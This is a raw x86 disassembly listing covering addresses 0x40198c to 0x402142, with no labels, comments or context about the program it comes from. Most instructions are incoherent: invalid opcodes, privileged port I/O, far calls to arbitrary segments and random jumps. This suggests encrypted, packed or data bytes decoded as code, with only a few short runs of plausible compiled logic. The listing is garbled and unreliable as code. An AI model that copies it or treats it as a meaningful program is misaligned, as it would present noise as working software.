  40198c:	sub    dl,cl
  40198e:	gs mov ecx,0x7e881019
  401994:	mov    bh,0x58
  401996:	clc    
  401997:	pop    es
  401998:	in     al,dx
  401999:	sbb    ecx,DWORD PTR [eax-0x95362ce]
  40199f:	and    bh,bl
  4019a1:	dec    eax
  4019a2:	fcmovb st,st(7)
  4019a4:	iret   
  4019a5:	jle    0x40198f
  4019a7:	stc    
  4019a8:	bound  esi,QWORD PTR [ebx]
  4019aa:	scas   eax,DWORD PTR es:[edi]
  4019ab:	or     al,0x87
  4019ad:	mov    eax,0xc45a4dac
  4019b2:	sbb    cl,BYTE PTR [ecx-0x5c9cd902]
  4019b8:	push   es
  4019b9:	sub    al,ch
  4019bb:	jg     0x4019fb
  4019bd:	mov    ebp,0xa558cdc1
  4019c2:	push   ds
  4019c3:	or     ebx,DWORD PTR cs:[ebx-0x3c]
  4019c7:	push   ss
  4019c8:	xor    al,0x92
  4019ca:	cmp    esp,DWORD PTR [eax+0x48b64f63]
  4019d0:	dec    eax
  4019d1:	mov    eax,0xeb1a61f4
  4019d6:	sub    ah,ch
  4019d8:	(bad)  
  4019d9:	call   0x80b91a87
  4019de:	mov    eax,0xfd8e282
  4019e3:	xchg   edx,eax
  4019e4:	test   DWORD PTR [ebp+0x7fbf3120],esi
  4019ea:	stc    
  4019eb:	pushf  
  4019ec:	pop    ebx
  4019ed:	fs dec eax
  4019ef:	or     al,bl
  4019f1:	push   0xffffffee
  4019f3:	fsubr  DWORD PTR [esi-0x28]
  4019f6:	enter  0x19e4,0x87
  4019fa:	inc    esp
  4019fb:	adc    eax,DWORD PTR [esi-0x7a]
  4019fe:	xor    al,0x0
  401a00:	retf   0xfa4b
  401a03:	dec    eax
  401a04:	add    eax,0x2608b779
  401a09:	scas   eax,DWORD PTR es:[edi]
  401a0a:	fnsave [edx+eiz*4]
  401a0d:	mul    ebx
  401a0f:	popf   
  401a10:	mov    ds:0x117449c4,eax
  401a15:	int    0x79
  401a17:	mov    ch,0x1
  401a19:	pop    esp
  401a1a:	mov    ds:0x235aea20,eax
  401a1f:	call   0xa56a:0x7bae2737
  401a26:	xchg   ebp,eax
  401a27:	jmp    0x401a87
  401a29:	jg     0x401a92
  401a2b:	push   esi
  401a2c:	das    
  401a2d:	data16 fxch st(3)
  401a30:	cmovne edi,DWORD PTR [esi+0x59]
  401a34:	sub    dl,BYTE PTR [eax]
  401a36:	mov    dl,0xfc
  401a38:	imul   edi,DWORD PTR [edi],0xd98630d6
  401a3e:	shl    BYTE PTR [ecx+edi*2],cl
  401a41:	adc    cl,BYTE PTR [edx-0x3e514d3c]
  401a47:	xchg   DWORD PTR [edx],eax
  401a49:	jb     0x401a4f
  401a4b:	xchg   esp,eax
  401a4c:	lods   eax,DWORD PTR ds:[esi]
  401a4d:	dec    ebx
  401a4e:	xor    BYTE PTR [esi],al
  401a50:	fidiv  DWORD PTR [ebx+0x69]
  401a53:	cmp    DWORD PTR [ebp-0x24],edx
  401a56:	cli    
  401a57:	out    dx,al
  401a58:	or     eax,0x208209a3
  401a5d:	in     eax,0x18
  401a5f:	inc    edx
  401a60:	xor    eax,0x53077962
  401a65:	adc    ch,dl
  401a67:	xor    eax,0xf7637b83
  401a6c:	jb     0x401a2f
  401a6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a6f:	mov    DWORD PTR [edi-0x31b26756],esi
  401a75:	retf   0x89a2
  401a78:	pop    ebp
  401a79:	mov    al,0xe9
  401a7b:	pushf  
  401a7c:	add    DWORD PTR [eax],eax
  401a7e:	add    BYTE PTR [ecx-0x4c264c60],dl
  401a84:	jmp    0x10588ada
  401a89:	push   ds
  401a8a:	dec    esp
  401a8b:	mov    eax,0xec15dc8
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401b01
  401a98:	iret   
  401a99:	mov    edx,0xd9af59b2
  401a9e:	xchg   edi,eax
  401a9f:	fild   WORD PTR [ecx]
  401aa1:	jmp    0x401af6
  401aa3:	stc    
  401aa4:	jns    0x401abb
  401aa6:	rcl    DWORD PTR [edx],1
  401aa8:	xchg   esi,eax
  401aa9:	xor    DWORD PTR [esi],ebp
  401aab:	pop    es
  401aac:	sbb    cl,BYTE PTR ds:0xe8077ee0
  401ab2:	sbb    BYTE PTR [esi-0x4b],bl
  401ab5:	pop    ds
  401ab6:	inc    ebx
  401ab7:	dec    al
  401ab9:	xchg   esp,eax
  401aba:	ds push edi
  401abc:	cdq    
  401abd:	mov    ds:0xfcd5766e,al
  401ac2:	dec    ebx
  401ac3:	inc    edi
  401ac4:	xchg   edx,eax
  401ac5:	stc    
  401ac6:	mul    BYTE PTR es:[ebx+0x6086b8ea]
  401acd:	(bad)  
  401ace:	mov    dh,0xfc
  401ad0:	sbb    eax,0x3f420133
  401ad5:	das    
  401ad6:	gs aas 
  401ad8:	in     eax,0x86
  401ada:	fdiv   QWORD PTR [eax+0x6a4aaacd]
  401ae0:	mov    esi,0x10a1e993
  401ae5:	sub    esi,DWORD PTR [ecx]
  401ae7:	adc    cl,BYTE PTR [edi-0x76]
  401aea:	jl     0x401b62
  401aec:	dec    esp
  401aed:	jmp    0x401b33
  401aef:	pop    edx
  401af0:	adc    eax,0x629ad40
  401af5:	mov    eax,ecx
  401af7:	xor    ch,BYTE PTR [ebp-0x7fdb117e]
  401afd:	cwde   
  401afe:	call   0x3eae:0x277c789
  401b05:	cmp    ah,dh
  401b07:	out    0xff,eax
  401b09:	hlt    
  401b0a:	fldenv [ecx+0x2f]
  401b0d:	inc    edi
  401b0e:	dec    esi
  401b0f:	xchg   ebx,eax
  401b10:	dec    esi
  401b11:	inc    esi
  401b12:	xor    ebx,eax
  401b14:	or     eax,0x1f5dc10b
  401b19:	cmp    edi,DWORD PTR ds:0x57dfa394
  401b1f:	imul   esi,DWORD PTR [ebp+0x29],0xffffffe8
  401b23:	fadd   st,st(1)
  401b25:	adc    edi,edi
  401b27:	cmp    eax,0xd0f53d3f
  401b2c:	mov    ds:0xafe845ae,eax
  401b31:	cmp    al,BYTE PTR [edx-0x344b15d4]
  401b37:	ror    edx,1
  401b39:	mov    ds:0xbac878e6,eax
  401b3e:	mov    esi,0xb7995623
  401b43:	push   0xffffffbf
  401b45:	ins    BYTE PTR es:[edi],dx
  401b46:	ret    
  401b47:	shr    BYTE PTR [ebp-0x22a4657f],0x49
  401b4e:	lahf   
  401b4f:	jle    0x401b3b
  401b51:	jnp    0x401b89
  401b53:	cwde   
  401b54:	retf   
  401b55:	int3   
  401b56:	inc    ecx
  401b57:	lods   eax,DWORD PTR ds:[esi]
  401b58:	mov    edi,0x22f6bfed
  401b5d:	sub    bl,dl
  401b5f:	mov    ch,0x3c
  401b61:	in     eax,dx
  401b62:	imul   ecx,DWORD PTR [ebx],0x62
  401b65:	adc    al,0x88
  401b67:	dec    ebp
  401b68:	outs   dx,BYTE PTR ds:[esi]
  401b69:	sub    ch,BYTE PTR [edx]
  401b6b:	jecxz  0x401bbd
  401b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b6e:	and    eax,0xb80864c9
  401b73:	retf   
  401b74:	inc    edx
  401b75:	jo     0x401bc0
  401b77:	pop    es
  401b78:	enter  0x60db,0x6f
  401b7c:	xor    al,bh
  401b7e:	loope  0x401bae
  401b80:	iret   
  401b81:	cmp    DWORD PTR [ebx],esp
  401b83:	out    dx,eax
  401b84:	popa   
  401b85:	jmp    0x401b12
  401b87:	(bad)  [esi+edx*1-0x56f64db0]
  401b8e:	js     0x401b4b
  401b90:	pop    esi
  401b91:	dec    eax
  401b92:	mov    ds:0x35d3ecae,al
  401b97:	and    edx,esp
  401b99:	mov    ah,0x71
  401b9b:	pop    edx
  401b9c:	push   0xffffffbf
  401b9e:	cmp    DWORD PTR ds:0x13844d3f,esp
  401ba4:	mov    ?,edi
  401ba6:	(bad)  
  401ba7:	jb     0x401b73
  401ba9:	int    0x62
  401bab:	fist   DWORD PTR [edi]
  401bad:	test   al,dl
  401baf:	dec    ecx
  401bb0:	cs sub al,0x4c
  401bb3:	pop    esi
  401bb4:	cmp    eax,0x9acd1f4
  401bb9:	hlt    
  401bba:	ins    BYTE PTR es:[edi],dx
  401bbb:	xchg   edx,eax
  401bbc:	leave  
  401bbd:	scas   eax,DWORD PTR es:[edi]
  401bbe:	test   ch,ah
  401bc0:	or     BYTE PTR [esi-0x6c],ch
  401bc3:	popf   
  401bc4:	fs aad 0x86
  401bc7:	aam    0xf
  401bc9:	mov    BYTE PTR [ecx-0x34],0x34
  401bcd:	out    dx,eax
  401bce:	and    DWORD PTR [esi],esp
  401bd0:	(bad)  
  401bd1:	mov    edx,0xada7f96b
  401bd6:	(bad)  
  401bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bd8:	call   0x40fc:0x57d6378b
  401bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401be0:	imul   esi,ebp,0x3cdb9cf
  401be6:	ins    BYTE PTR es:[edi],dx
  401be7:	jo     0x401c2b
  401be9:	mov    edx,0x2f74a615
  401bee:	sti    
  401bef:	call   0xc1d9:0xcca4b94a
  401bf6:	nop
  401bf7:	sbb    eax,ebx
  401bf9:	lods   al,BYTE PTR ds:[esi]
  401bfa:	xchg   BYTE PTR [esi+0x7101f8ea],ah
  401c00:	and    eax,ebx
  401c02:	call   0xdd58:0x7633e7b9
  401c09:	sub    edi,ecx
  401c0b:	loope  0x401b98
  401c0d:	lods   al,BYTE PTR ds:[esi]
  401c0e:	or     ebp,esi
  401c10:	pop    edi
  401c11:	fisub  WORD PTR [edx+0x13ada7c1]
  401c17:	sbb    eax,DWORD PTR [eax]
  401c19:	jle    0x401c70
  401c1b:	mov    eax,DWORD PTR [ebp-0x50]
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	or     ebp,DWORD PTR [ecx+eax*1-0x59]
  401c44:	mov    bh,BYTE PTR [ecx+0x7e]
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401c78
  401c4d:	ret    0x1f9e
  401c50:	jne    0x401c4e
  401c52:	cmp    al,0x19
  401c54:	inc    ebp
  401c55:	xchg   esi,eax
  401c56:	enter  0x886f,0x59
  401c5a:	call   0xe2787121
  401c5f:	or     al,0x2c
  401c61:	aad    0xc6
  401c63:	mov    ecx,0x9bb07c4b
  401c68:	pop    ecx
  401c69:	pshufw mm5,QWORD PTR [ecx-0x6b],0xc
  401c6e:	mov    eax,0xda27fa07
  401c73:	inc    ecx
  401c74:	mov    esp,0x179b3c8a
  401c79:	bnd ret 0x858d
  401c7d:	ret    
  401c7e:	push   ebp
  401c7f:	sub    DWORD PTR [edx-0x67],esi
  401c82:	arpl   WORD PTR [edi+0x5ca7ee18],bp
  401c88:	pop    eax
  401c89:	mov    esp,0xfe453e76
  401c8e:	outs   dx,DWORD PTR ds:[esi]
  401c8f:	js     0x401cc6
  401c91:	imul   ebx
  401c93:	ds add edx,edi
  401c96:	and    al,0xd3
  401c98:	clc    
  401c99:	loop   0x401ce2
  401c9b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  401c9d:	fcomp  DWORD PTR [ebx-0x80]
  401ca0:	call   0xde265e8f
  401ca5:	lods   al,BYTE PTR ds:[esi]
  401ca6:	push   cs
  401ca7:	adc    cl,BYTE PTR [eax+0x1d90f198]
  401cad:	loope  0x401c95
  401caf:	xor    edx,DWORD PTR [edi]
  401cb1:	xchg   esi,eax
  401cb2:	aas    
  401cb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cb4:	dec    ecx
  401cb5:	mov    WORD PTR [ebx+0x0],fs
  401cb8:	pop    ds
  401cb9:	push   0xf039a16f
  401cbe:	mov    al,ds:0x1b6b7c97
  401cc3:	jnp    0x401cd0
  401cc5:	cli    
  401cc6:	test   eax,0x94ae236c
  401ccb:	inc    esi
  401ccc:	push   0x709ae9db
  401cd1:	dec    esp
  401cd2:	sub    ecx,ebp
  401cd4:	adc    esi,DWORD PTR [edx-0x6b]
  401cd7:	inc    edi
  401cd8:	xchg   ebx,eax
  401cd9:	mov    esp,0x2e3915cd
  401cde:	nop
  401cdf:	push   0xffffffba
  401ce1:	add    DWORD PTR [edi-0x72bc3ac4],ecx
  401ce7:	jp     0x401d01
  401ce9:	cmp    DWORD PTR ds:0xfe5de132,edx
  401cef:	std    
  401cf0:	sar    ecx,1
  401cf2:	xchg   edi,eax
  401cf3:	iret   
  401cf4:	or     al,0xbd
  401cf6:	xchg   DWORD PTR [edx-0x70],ecx
  401cf9:	push   edi
  401cfa:	(bad)  
  401cfb:	out    dx,al
  401cfc:	lea    esi,[edx-0x71b2a36c]
  401d02:	mov    ebp,0x1e941f43
  401d07:	mov    edi,0xc46a39c
  401d0c:	stos   DWORD PTR es:[edi],eax
  401d0d:	rcr    ebx,cl
  401d0f:	xor    DWORD PTR [esi-0x75],edi
  401d12:	jno    0x401d08
  401d14:	add    DWORD PTR [eax+0x562ee3b6],edi
  401d1a:	sbb    DWORD PTR [ebx-0x7aea7581],edx
  401d20:	mov    edx,0xe883af7b
  401d25:	and    al,0x61
  401d27:	push   ds
  401d28:	xlat   BYTE PTR ds:[ebx]
  401d29:	xor    dh,BYTE PTR ds:0xef146383
  401d2f:	xchg   edx,eax
  401d30:	jo     0x401cbe
  401d32:	inc    ecx
  401d33:	in     al,0xe1
  401d35:	add    DWORD PTR [esi],eax
  401d37:	lods   eax,DWORD PTR ds:[esi]
  401d38:	and    al,0xfb
  401d3a:	outs   dx,BYTE PTR ds:[esi]
  401d3b:	mov    ?,WORD PTR [esi+eiz*2-0x15]
  401d3f:	in     al,dx
  401d40:	xchg   ebx,eax
  401d41:	sub    DWORD PTR [edx-0x534607df],esi
  401d47:	ss das 
  401d49:	(bad)  
  401d4a:	pop    esi
  401d4b:	mov    bl,0x5d
  401d4d:	push   ecx
  401d4e:	mov    eax,ds:0xdb785775
  401d53:	in     al,0x8f
  401d55:	shr    BYTE PTR [esi+0x1cfeac52],1
  401d5b:	and    DWORD PTR [edx],edi
  401d5d:	aas    
  401d5e:	int3   
  401d5f:	imul   edi,DWORD PTR [ebx-0x7f],0x30
  401d63:	loop   0x401d43
  401d65:	dec    ecx
  401d66:	mov    cl,0x2b
  401d68:	lods   eax,DWORD PTR ds:[esi]
  401d69:	in     al,dx
  401d6a:	retf   
  401d6b:	jg     0x401cfd
  401d6d:	out    0x22,al
  401d6f:	inc    ecx
  401d70:	call   0xa80:0x1ac5d0b
  401d77:	sar    BYTE PTR [ebx-0x365524dd],cl
  401d7d:	ja     0x401d1f
  401d7f:	xlat   BYTE PTR ds:[ebx]
  401d80:	pushf  
  401d81:	cdq    
  401d82:	jp     0x401d04
  401d84:	mov    cl,0x1e
  401d86:	lea    esp,[edx+0x3e]
  401d89:	sbb    eax,0x640e088
  401d8e:	sub    eax,0x7cf28dd2
  401d93:	mov    edx,0x92358fcc
  401d98:	cwde   
  401d99:	(bad)  
  401d9a:	lock sbb ebp,DWORD PTR [edi-0x50]
  401d9e:	xchg   ebp,eax
  401d9f:	retf   
  401da0:	dec    esi
  401da1:	mov    ch,0x1a
  401da3:	scas   eax,DWORD PTR es:[edi]
  401da4:	dec    eax
  401da5:	xchg   esp,eax
  401da6:	dec    esp
  401da7:	(bad)  
  401da8:	(bad)  
  401da9:	mov    dl,0x6a
  401dab:	mov    ah,0xae
  401dad:	dec    ebx
  401dae:	hlt    
  401daf:	mov    dl,0x6a
  401db1:	in     eax,0x6
  401db3:	jp     0x401ddf
  401db5:	scas   al,BYTE PTR es:[edi]
  401db6:	inc    edi
  401db7:	rcl    DWORD PTR [ebx+0x62],0x47
  401dbb:	xor    eax,DWORD PTR [eax]
  401dbd:	add    eax,0x7c9fd0a
  401dc2:	ret    
  401dc3:	cmc    
  401dc4:	and    DWORD PTR [edx+0x4f],esi
  401dc7:	pop    ecx
  401dc8:	loop   0x401d7f
  401dca:	outs   dx,BYTE PTR ds:[esi]
  401dcb:	shl    BYTE PTR [eax],1
  401dcd:	or     BYTE PTR [esi-0x7638fcde],bh
  401dd3:	inc    ecx
  401dd4:	add    al,0x8b
  401dd6:	inc    ebp
  401dd7:	aam    0x8b
  401dd9:	dec    ebp
  401dda:	clc    
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax+0x5b001e38],ebp
  401e0d:	adc    BYTE PTR [esi],dl
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401dae
  401e17:	jbe    0x401e2a
  401e19:	and    DWORD PTR [esi],edi
  401e1b:	xor    edx,DWORD PTR [ebp+0x5e]
  401e1e:	jmp    0xeafe5612
  401e23:	retf   0x8826
  401e26:	jge    0x401db9
  401e28:	cmp    al,BYTE PTR [ebp+ebx*8-0x74909b65]
  401e2f:	loope  0x401db8
  401e31:	lock add DWORD PTR ds:0xad214b93,ecx
  401e38:	and    dl,BYTE PTR [edi]
  401e3a:	sbb    al,0xf3
  401e3c:	mov    ecx,0x9430181a
  401e41:	mov    al,ds:0x87d8eee6
  401e46:	pop    es
  401e47:	hlt    
  401e48:	dec    esp
  401e49:	jno    0x401dfc
  401e4b:	xchg   edx,eax
  401e4c:	xor    eax,0xda8c65db
  401e51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e52:	add    ah,BYTE PTR [eax-0x55]
  401e55:	retf   
  401e56:	pop    ds
  401e57:	adc    al,0xf8
  401e59:	pushf  
  401e5a:	imul   dl
  401e5c:	(bad)  
  401e5d:	out    dx,eax
  401e5e:	ret    0x88e9
  401e61:	dec    ebp
  401e62:	in     eax,0x76
  401e64:	dec    ebp
  401e65:	jnp    0x401ec1
  401e67:	lods   eax,DWORD PTR ds:[esi]
  401e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e69:	imul   edi,edx,0x2d
  401e6c:	or     eax,0x83c61845
  401e71:	add    cl,cl
  401e73:	std    
  401e74:	pop    esi
  401e75:	jae    0x401e60
  401e77:	xchg   edx,eax
  401e78:	jne    0x401ec1
  401e7a:	lea    eax,ds:0xc93916fc
  401e80:	dec    esi
  401e81:	aas    
  401e82:	add    DWORD PTR ds:0xc9a0bbcb,edi
  401e88:	sbb    eax,0xf98685c8
  401e8d:	cmp    edx,ebx
  401e8f:	inc    eax
  401e90:	dec    ecx
  401e91:	test   eax,0xe67b46ce
  401e96:	outs   dx,DWORD PTR ds:[esi]
  401e97:	adc    ah,dl
  401e99:	push   ebp
  401e9a:	pop    esp
  401e9b:	shl    DWORD PTR [ebx+esi*1],cl
  401e9e:	push   ebp
  401e9f:	out    0xf3,al
  401ea1:	sbb    DWORD PTR [esi-0x7d],edi
  401ea4:	xor    al,0xb8
  401ea6:	imul   esp,DWORD PTR [eax-0xd],0xffffffe5
  401eaa:	mov    dh,0xd
  401eac:	and    al,0xc8
  401eae:	es enter 0x29b4,0x21
  401eb3:	xchg   cl,dh
  401eb5:	lahf   
  401eb6:	pop    ecx
  401eb7:	test   al,0xfc
  401eb9:	adc    eax,0x3a328d87
  401ebe:	(bad)  
  401ebf:	cld    
  401ec0:	jne    0x401e5b
  401ec2:	mov    bl,0xe6
  401ec4:	(bad)  
  401ec5:	add    esi,DWORD PTR [edx]
  401ec7:	ja     0x601b1c34
  401ecd:	xchg   edx,eax
  401ece:	mov    ds:0xc82ea99d,al
  401ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ed4:	fnstsw WORD PTR [esi-0x7e]
  401ed7:	addr16 push eax
  401ed9:	addr16 push edx
  401edb:	sbb    DWORD PTR [edi],edi
  401edd:	dec    esi
  401ede:	push   eax
  401edf:	pop    ss
  401ee0:	mov    BYTE PTR [ecx+0x6a523957],dl
  401ee6:	daa    
  401ee7:	retf   0xe8e2
  401eea:	cmp    cl,BYTE PTR [ebp+0x35d3f771]
  401ef0:	xor    esp,ecx
  401ef2:	sub    BYTE PTR ds:0x134a1430,al
  401ef8:	sahf   
  401ef9:	mov    BYTE PTR [ecx+esi*8-0x1b227871],dl
  401f00:	xchg   edx,eax
  401f01:	sbb    DWORD PTR [edx+ecx*4],0x47
  401f05:	aad    0xa0
  401f07:	push   esp
  401f08:	pop    edx
  401f09:	sub    DWORD PTR [ecx],eax
  401f0b:	sbb    eax,0xe5b57cbf
  401f10:	mov    al,0xf5
  401f12:	mov    cl,0xb
  401f14:	lds    ebx,FWORD PTR [ebx]
  401f16:	jg     0x401eab
  401f18:	push   ebp
  401f19:	fisubr DWORD PTR [edx+0x69c5151e]
  401f1f:	repnz retf 
  401f21:	pop    esi
  401f22:	xchg   esp,eax
  401f23:	repnz outs dx,DWORD PTR ds:[esi]
  401f25:	xor    al,0xbd
  401f27:	sar    DWORD PTR [esi],0x66
  401f2a:	shr    eax,0xb6
  401f2d:	xor    eax,edi
  401f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f30:	dec    ecx
  401f31:	addr16 (bad) 
  401f33:	in     al,dx
  401f34:	mov    esp,0x57192310
  401f39:	dec    edx
  401f3a:	fsubrp st(0),st
  401f3c:	ss fadd st(1),st
  401f3f:	repnz mov cs,WORD PTR [ebp-0x4e6a0bfd]
  401f46:	cld    
  401f47:	ss mov dh,0xcc
  401f4a:	jmp    0xa4e56022
  401f4f:	and    eax,0x47c512f5
  401f54:	ds (bad) 
  401f56:	in     al,0xd
  401f58:	sti    
  401f59:	aas    
  401f5a:	jbe    0x401fc8
  401f5c:	inc    esp
  401f5d:	add    ah,BYTE PTR [edi+0x5e78f872]
  401f63:	push   edx
  401f64:	pop    edx
  401f65:	xchg   edi,eax
  401f66:	out    dx,al
  401f67:	and    ah,BYTE PTR [esi]
  401f69:	cmp    DWORD PTR ds:0x14e95f18,esp
  401f6f:	adc    DWORD PTR [ebp-0x2ca3347a],ecx
  401f75:	mov    al,ds:0xc5f474c7
  401f7a:	cmp    eax,0xf44d3003
  401f7f:	pop    esi
  401f80:	enter  0x48e3,0x0
  401f84:	pop    ebx
  401f85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f86:	mov    WORD PTR [eax+0x6a],?
  401f89:	popa   
  401f8a:	aam    0x80
  401f8c:	xchg   ebp,eax
  401f8d:	mov    BYTE PTR [ebx+0x58],al
  401f90:	retf   
  401f91:	inc    edx
  401f92:	mov    eax,0x5d71d6bf
  401f97:	dec    ecx
  401f98:	ds std 
  401f9a:	je     0x40230d
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0x9edfd049
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401f8f
  401fcc:	xor    al,0x44
  401fce:	test   esi,ebp
  401fd0:	mov    bh,0x85
  401fd2:	in     eax,0xee
  401fd4:	out    dx,al
  401fd5:	aas    
  401fd6:	push   ds
  401fd7:	stc    
  401fd8:	sub    dl,BYTE PTR [edx+0x56]
  401fdb:	cwde   
  401fdc:	das    
  401fdd:	push   ds
  401fde:	adc    cl,dl
  401fe0:	mov    ah,0x69
  401fe2:	inc    ebx
  401fe3:	cmp    eax,0x971a3674
  401fe8:	push   eax
  401fe9:	stos   DWORD PTR es:[edi],eax
  401fea:	cmp    al,0xce
  401fec:	or     BYTE PTR [edi+ebp*2],bh
  401fef:	jne    0x401fba
  401ff1:	push   0x206dbcf0
  401ff6:	(bad)  
  401ff7:	xor    eax,esp
  401ff9:	jno    0x401f7c
  401ffb:	xchg   esi,eax
  401ffc:	mov    al,0x6b
  401ffe:	mov    eax,0x6bda994a
  402003:	mov    ebx,0xacf4356d
  402008:	push   ss
  402009:	or     eax,0xf2bf4383
  40200e:	rcr    ecx,1
  402010:	mov    ah,0x30
  402013:	test   BYTE PTR [esi+0x218c5d36],dh
  402019:	sub    BYTE PTR [eax-0x12],0xd
  40201d:	adc    BYTE PTR [ebx],0x6b
  402020:	or     DWORD PTR [edi],esp
  402022:	inc    ebx
  402023:	cmp    BYTE PTR [edx-0x1d421a8a],bh
  402029:	mov    eax,0x22936a0d
  40202e:	mov    ecx,0x46969263
  402033:	(bad)  
  402034:	sbb    al,0xf7
  402036:	gs sub eax,0xe51a0b39
  40203c:	jmp    0xf227:0xbe7183a9
  402043:	inc    ecx
  402044:	stos   BYTE PTR es:[edi],al
  402045:	in     eax,0xb9
  402047:	jae    0x401fea
  402049:	xor    BYTE PTR gs:[edi+0x67],dl
  40204d:	sar    dl,cl
  40204f:	dec    ebx
  402050:	data16 mov ah,0x9b
  402053:	cmp    al,0x7e
  402055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402056:	loope  0x4020b8
  402058:	mov    bl,0x34
  40205a:	cmp    eax,0xb493f9ab
  40205f:	or     eax,0xd6ade0e
  402064:	dec    ebp
  402065:	mov    ecx,DWORD PTR [esi-0x1eeac80]
  40206b:	js     0x40201c
  40206d:	lods   eax,DWORD PTR ds:[esi]
  40206e:	xchg   DWORD PTR [edx],eax
  402070:	inc    esi
  402071:	dec    ecx
  402072:	icebp  
  402073:	sbb    ah,0x47
  402076:	add    DWORD PTR [edi-0x73],esi
  402079:	and    al,0xea
  40207b:	imul   esi,DWORD PTR [edx+0x4d],0x48ae618
  402082:	retf   
  402083:	sbb    bl,BYTE PTR [ebx+0x1d4ac765]
  402089:	mov    cl,0xfe
  40208b:	rol    ebp,0xf8
  40208e:	(bad)  
  40208f:	push   ebp
  402090:	xchg   ecx,eax
  402091:	push   0x99a4f1b0
  402096:	mov    eax,0x8b0356ff
  40209b:	inc    edx
  40209c:	jbe    0x402083
  40209e:	sbb    cl,0x80
  4020a1:	push   ss
  4020a2:	aas    
  4020a3:	hlt    
  4020a4:	xchg   edx,eax
  4020a5:	sbb    BYTE PTR [ecx+0x2e2fecb3],dh
  4020ab:	add    BYTE PTR [ecx-0x77],0x73
  4020af:	mov    ebx,0x58a7624d
  4020b4:	popa   
  4020b5:	icebp  
  4020b6:	jne    0x402128
  4020b8:	aas    
  4020b9:	(bad)  
  4020ba:	fs push edi
  4020bc:	adc    ebx,DWORD PTR [esi]
  4020be:	lods   al,BYTE PTR ds:[esi]
  4020bf:	or     dh,BYTE PTR [edx-0x796e5bb5]
  4020c5:	ja     0x402072
  4020c7:	dec    eax
  4020c8:	add    BYTE PTR [edx],dh
  4020ca:	dec    ebx
  4020cb:	mov    eax,0xcb52648a
  4020d0:	outs   dx,BYTE PTR ds:[esi]
  4020d1:	leave  
  4020d2:	dec    edi
  4020d3:	test   DWORD PTR [edx-0x4b],edi
  4020d6:	hlt    
  4020d7:	adc    BYTE PTR [edx],dl
  4020d9:	mov    esp,eax
  4020db:	pop    esi
  4020dc:	cmc    
  4020dd:	sub    bl,bl
  4020df:	cli    
  4020e0:	mov    esp,0xde3acd8d
  4020e5:	push   cs
  4020e6:	push   ebp
  4020e7:	pop    ecx
  4020e8:	push   ebp
  4020e9:	enter  0xb874,0xff
  4020ed:	add    edi,DWORD PTR [edi+0x4fb75af]
  4020f3:	aad    0x12
  4020f5:	icebp  
  4020f6:	imul   edx,DWORD PTR [esi],0xf99a8f96
  4020fc:	add    BYTE PTR [edi+0xf],cl
  4020ff:	add    BYTE PTR [eax-0x70],0xfd
  402103:	enter  0xebf0,0xc5
  402107:	imul   ebp,DWORD PTR [ebx-0x12],0x5870f8b3
  40210e:	mov    ebx,0x3b42d74e
  402113:	xor    bl,0x96
  402116:	lods   eax,DWORD PTR ds:[esi]
  402117:	fld    st(4)
  402119:	aaa    
  40211a:	cmp    al,0x34
  40211c:	jmp    0x184a:0xe0b6
  402122:	mov    dh,0xad
  402124:	dec    esi
  402125:	xchg   bl,dl
  402127:	sbb    eax,0x9bb32dd
  40212c:	pop    ebx
  40212d:	jmp    0xa87086b8
  402132:	push   cs
  402133:	add    al,0xc9
  402135:	gs inc esi
  402137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402138:	sbb    esi,ebp
  40213a:	inc    ebx
  40213b:	aam    0x24
  40213d:	mov    esp,0x2ef0b8bf
  402142:	outs   dx,DWORD PTR ds:[esi]
